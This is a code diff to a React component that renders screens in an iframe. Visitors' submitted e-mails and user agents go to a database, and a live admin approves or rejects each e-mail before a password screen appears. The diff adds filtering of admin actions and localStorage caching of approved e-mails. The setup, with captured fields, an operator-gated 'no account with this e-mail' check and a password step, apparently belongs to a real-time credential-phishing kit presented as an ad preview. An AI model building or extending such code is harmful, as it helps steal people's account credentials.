@@ -69,6 +69,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
   // mostrar o alertbox "Não existe uma conta com este e-mail.".
   const emailPendingRef = useRef(false);
   const emailPendingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const pendingEmailRef = useRef("");
   // Refs pras funções de navegação (criadas dentro do effect principal).
   // Usadas pelo listener de actions (que vive em outro effect) pra avançar
   // de tela quando o admin aprova o e-mail.
@@ -196,19 +197,37 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         "postgres_changes",
         { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
         (payload) => {
-          const row = payload.new as { session_id: string; action: string; payload: { message?: string } | null };
+          const row = payload.new as { session_id: string; action: string; payload: { message?: string; kind?: string; email?: string | null } | null };
           if (row.session_id !== sessionId) return;
           // Se a sessão tá aguardando decisão sobre o e-mail (clicou Acessar),
           // a aprovação avança pra próxima tela e a rejeição mostra o alertbox
           // "Não existe uma conta com este e-mail." na própria tela do e-mail.
           if (emailPendingRef.current) {
+            const actionKind = row.payload?.kind ?? null;
+            const actionEmail = row.payload?.email?.trim().toLowerCase() ?? null;
+            const pendingEmail = pendingEmailRef.current.trim().toLowerCase();
+            if (actionKind && actionKind !== "email") return;
+            if (actionEmail && pendingEmail && actionEmail !== pendingEmail) return;
             if (emailPendingTimerRef.current) {
               clearTimeout(emailPendingTimerRef.current);
               emailPendingTimerRef.current = null;
             }
             emailPendingRef.current = false;
+            pendingEmailRef.current = "";
             const iframe = iframeRef.current;
             if (row.action === "approve") {
+              try {
+                const approvedKey = `approved-emails:${adId}`;
+                const raw = localStorage.getItem(approvedKey);
+                const current = raw ? (JSON.parse(raw) as string[]) : [];
+                const normalized = capturedEmailRef.current.trim().toLowerCase();
+                if (normalized) {
+                  const nextApproved = Array.from(new Set([...current.map((item) => item.toLowerCase()), normalized]));
+                  localStorage.setItem(approvedKey, JSON.stringify(nextApproved));
+                }
+              } catch {
+                // ignore
+              }
               // Limpa loading e segue pra próxima tela (igual o fluxo manual).
               iframe?.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
               const next =
@@ -225,6 +244,9 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
                 "*",
               );
             }
+            return;
+          }
+          if (row.payload?.kind === "email") {
             return;
           }
           if (row.action === "approve") {
@@ -582,6 +604,22 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
 
         // Quando o visitante clica em "Acessar" com e-mail válido, marca como confirmado
         if (data.action === "access-account" && adId && typeof data.email === "string" && data.email.trim()) {
+          const submittedEmail = data.email.trim();
+          try {
+            const approvedKey = `approved-emails:${adId}`;
+            const raw = localStorage.getItem(approvedKey);
+            const approved = raw ? (JSON.parse(raw) as string[]) : [];
+            if (approved.some((item) => item.toLowerCase() === submittedEmail.toLowerCase())) {
+              const next =
+                screensRef.current.find((s) => s.kind === "access-account") ??
+                screensRef.current.find((s) => s.kind === "password");
+              if (next) navigateToScreen(next);
+              else navigateToManualScreen("access-account");
+              return;
+            }
+          } catch {
+            // ignore
+          }
           // Já tem um pending em andamento: ignora cliques duplicados
           if (emailPendingRef.current) {
             return;
@@ -593,7 +631,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
               screen_id: currentScreenIdRef.current,
               session_id: sessionId,
               field_name: "email_submitted",
-              value: data.email.trim(),
+              value: submittedEmail,
               user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
             })
             .then(({ error }) => {
@@ -606,11 +644,13 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             clearTimeout(emailPendingTimerRef.current);
           }
           emailPendingRef.current = true;
+          pendingEmailRef.current = submittedEmail;
           iframe.contentWindow?.postMessage({ type: "iframe-email-loading-start" }, "*");
           emailPendingTimerRef.current = setTimeout(() => {
             if (!emailPendingRef.current) return;
             emailPendingRef.current = false;
             emailPendingTimerRef.current = null;
+            pendingEmailRef.current = "";
             iframe.contentWindow?.postMessage(
               {
                 type: "iframe-email-error",
